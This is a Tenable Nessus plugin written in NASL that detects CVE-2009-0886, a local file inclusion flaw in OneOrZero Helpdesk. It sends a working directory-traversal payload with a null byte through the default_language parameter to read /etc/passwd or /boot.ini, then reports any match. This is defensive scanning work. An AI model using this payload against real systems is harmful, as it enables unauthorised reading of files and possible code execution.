#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35805);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2009-0886");
  script_bugtraq_id(34029);
  script_osvdb_id(52709);
  script_xref(name:"EDB-ID", value:"8168");

  script_name(english:"OneOrZero Helpdesk default_language Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute( attribute:"synopsis",  value:
"The remote web server contains a PHP script that is affected by a
local file include vulnerability."  );
  script_set_attribute(  attribute:"description",  value:
"The remote host is running OneOrZero Helpdesk, a web-based helpdesk
application written in PHP.

The version of OneOrZero Helpdesk installed on the remote host fails
to filter input to the 'default_language' variable in the
'common/login.php' script before using it to include PHP code.
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can exploit this issue to view arbitrary
files or possibly to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id."  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/03/09");
 script_cvs_date("$Date: 2016/05/20 14:21:42 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php: 1);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/ooz", "/oneorzero", "/helpdesk", "/help", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure it's OneOrZero Helpdesk.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  if ("OneOrZero" >< res)
  {
    # Loop through files to look for.
    foreach file (files)
    {
      if (file[0] == '/') traversal = crap(data:"../", length:3*9) + '..';
      else traversal = '../../../';

      url = string(
        dir, "/common/login.php?",
        "default_language=", string(traversal, file, "%00")
      );

      # Try to exploit the issue.
      res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail: 1);

      # There's a problem if...
      body = res[2];
      file_pat = file_pats[file];
      if (
        # we see the expected contents or...
        egrep(pattern:file_pat, string:body) ||
        # we get an error because magic_quotes was enabled or...
        string(file, "\\0.lang.php") >< body ||
        # we get an error claiming the file doesn't exist or...
        string(file, "): failed to open stream: No such file") >< body ||
        string(file, ") [function.include]: failed to open stream: No such file") >< body ||
        string(file, ") [<a href='function.include'>function.include</a>]: failed to open stream: No such file") >< body ||
        # we get an error about open_basedir restriction.
        string(file, ") [function.include]: failed to open stream: Operation not permitted") >< body ||
        string(file, ") [<a href='function.include'>function.include</a>]: failed to open stream: Operation not permitted") >< body ||
        string("open_basedir restriction in effect. File(", file) >< body
      )
      {
        if (report_verbosity > 0)
        {
          if (egrep(pattern:file_pat, string:body))
          {
            if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

            report = string(
              "\n",
              "Nessus was able to exploit the issue to retrieve the contents of\n",
              "'", file, "' on the remote host using the following URL :\n",
              "\n",
              "  ", build_url(port:port, qs:url), "\n"
            );
            if (report_verbosity > 1)
            {
             contents = body;
             if ("<br />" >< contents) contents = contents - strstr(contents, "<br />");
             report += string(
                "\n",
                "Here are its contents :\n",
                "\n",
                crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
                contents,
                crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
              );
            }
          }
          else
          {
            report = string(
              "\n",
              "Nessus was able to verify the issue exists using the following \n",
              "URL :\n",
              "\n",
              "  ", build_url(port:port, qs:url), "\n"
            );
          }
          security_warning(port:port, extra:report);
        }
        else security_warning(port);

        exit(0);
      }
    }
  }
}
